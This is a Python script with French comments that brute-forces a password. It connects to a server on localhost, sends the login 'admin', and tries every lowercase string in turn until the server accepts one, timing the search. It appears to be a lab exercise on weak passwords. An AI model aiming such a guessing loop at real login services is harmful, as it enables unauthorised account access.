import socket
import time
import string

# Fonction pour générer les mots de passe avec brute force
def generer_mot_de_passe_brute_force():
    chars = string.ascii_lowercase  # Utilisation des lettres de a à z
    mot_de_passe = ['a']  # Démarre avec 'a'
    
    while True:
        yield ''.join(mot_de_passe)
        
        # On incrémente le mot de passe (ex: a -> b, z -> aa, ab -> ac, etc.)
        for i in range(len(mot_de_passe) - 1, -1, -1):
            if mot_de_passe[i] != 'z':
                mot_de_passe[i] = chr(ord(mot_de_passe[i]) + 1)
                break
            else:
                mot_de_passe[i] = 'a'
                if i == 0:
                    mot_de_passe.append('a')
                continue

# Fonction du client qui tente le brute force
def brute_force_login():
    host = 'localhost'  # Adresse du serveur
    port = 1234

    # Connexion au serveur
    s = socket.socket()
    s.connect((host, port))

    # Réception de la bannière
    print(s.recv(1024).decode())

    # Envoi du login correct
    login = "admin"
    s.send(login.encode())

    # Réception de la réponse du serveur concernant le login
    print(s.recv(1024).decode())

    # Initialisation du brute force
    generer_mdp = generer_mot_de_passe_brute_force()
    trouve = False
    debut = time.time()  # Temps de départ

    # Boucle brute force pour tester chaque mot de passe
    while not trouve:
        # Génère un nouveau mot de passe
        tentative_mdp = next(generer_mdp)
        
        # Envoi de la tentative de mot de passe au serveur
        s.send(tentative_mdp.encode())
        
        # Réception de la réponse du serveur
        reponse = s.recv(1024).decode()
        print(f"Test du mot de passe : {tentative_mdp} -> {reponse}")
        
        if "Mot de passe correct" in reponse:
            trouve = True

    # Calcul du temps écoulé
    fin = time.time()
    print(f"Mot de passe trouvé : {tentative_mdp}")
    print(f"Temps pris : {fin - debut:.2f} secondes")

    # Fermeture de la connexion
    s.close()

# Exécution du client
brute_force_login()
